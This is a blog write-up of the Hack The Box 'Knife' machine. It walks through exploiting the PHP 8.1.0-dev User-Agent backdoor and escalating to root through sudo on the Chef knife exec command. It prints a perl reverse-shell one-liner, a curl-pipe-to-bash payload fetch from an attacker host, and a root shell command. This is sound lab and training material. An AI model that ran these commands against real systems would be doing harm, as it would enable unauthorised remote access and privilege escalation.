---
layout: single
sitemap: true
title: "Hack the box writeup [Knife]"
categories:
  - Blog
tags:
  - CTF
  - HTB
  - writeup
---

Knife was a easy box on HTB. It's was rated as more like a CTF styled box. It took me few hours to get root, but it was fun box. Lets walkthrough on how I approached to root this box. 

The IP for the Knife box is `10.10.10.242` so adding it to hosts file as `knife.htb`

```bash
sudo echo -n 10.10.10.242  knife.htb >> /etc/hosts
```
The first thing to run is a nmap scan to know what services are listening on this box.

```bash
nmap -sC -sV -p- -oN  ports.txt knife.htb
Nmap scan report for knife.htb (10.10.10.242)
Host is up (0.069s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Emergent Medical Idea
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 124.19 seconds
```
So, we got two ports 22 and 80 open. I started `dirb` on the port 80 while taking a look at it in browser. It had some medical website look to which nothing seemed interesting. Dirbuster came back with two hits in which nothing looked useful.
```
---- Scanning URL: http://knife.htb/ ----
+ http://knife.htb/index.php (CODE:200|SIZE:5815)                                                                                     
+ http://knife.htb/server-status (CODE:403|SIZE:274)            
```
 Now tried looking at the headers of the http server running on port-80. We can use a browser, curl or burpsuite anything for it.
```
< HTTP/1.1 200 OK
< Date: Sun, 30 May 2021 17:04:41 GMT
< Server: Apache/2.4.41 (Ubuntu)
< X-Powered-By: PHP/8.1.0-dev
< Vary: Accept-Encoding
< Transfer-Encoding: chunked
< Content-Type: text/html; charset=UTF-8
```
Two things in here looks promising which is `Apache/2.4.41` & `PHP/8.1.0-dev`. Searched for Apache exploits for this version, found nothing useful. Than for the PHP version searched for sometime and came across this [exploit](https://packetstormsecurity.com/files/162749/PHP-8.1.0-dev-Backdoor-Remote-Command-Injection.html). 

For this exact PHP version if the User-Agent is passed as `zerodiumsystem` then we can execute code without any authentication on the server. This is a part of a [recent attack](https://www.bleepingcomputer.com/news/security/phps-git-server-hacked-to-add-backdoors-to-php-source-code/) on php git server in an effort to add backdoor to its codebase. 

Than I used a perl based reverse shell to gain shell on the system using the exploit. 

```perl
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"<IP>:<PORT>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
The command to gain reverse shell looked like this for me. 

```
python exploit.py -u http://knife.htb/ -c 'curl http://<my_IP>:8080/rs.sh | bash '
```
This will fetch the reverse shell perl command from my server and execute it on the box giving us the shell. 
```bash
id
uid=1000(james) gid=1000(james) groups=1000(james)
```
We got a reverse shell as `james` user and so we got the user flag in the home directory. 

### Gaining root shell

First of all I tried checking user by viewing the `/etc/passwd` file but nothing interesting there. Now tried running `sudo -l` to checked the allowed commands for sudo and got an interesting entry.

```
User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```
James user can run this process called `knife` as root without any password. The box name was a hint here. Tried to check what knife process can do.
```bash
knife -h
Chef Infra Client: 16.10.8
```
This was a standard knife command for the Chef Infra client. I quickly googled it and open its documentation at https://docs.chef.io/workstation/knife/ .
While going through the subcommands for knife one commands was found useful to us. 

*Use the **knife exec** subcommand to execute Ruby scripts in the context of a fully configured Chef Infra Client.* 

With little bit of playing with this command was able to finally create the final command to get the root shell. 
```bash
sudo knife exec -E 'exec "/bin/sh -i" '
```
This will spawn a bash shell via ruby which executes as root process. Hence rooted the `knife ` box. The root flag can be found at `/root/root.txt` 

```bash
id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
knife
```

Happy Hacking !! 🙂
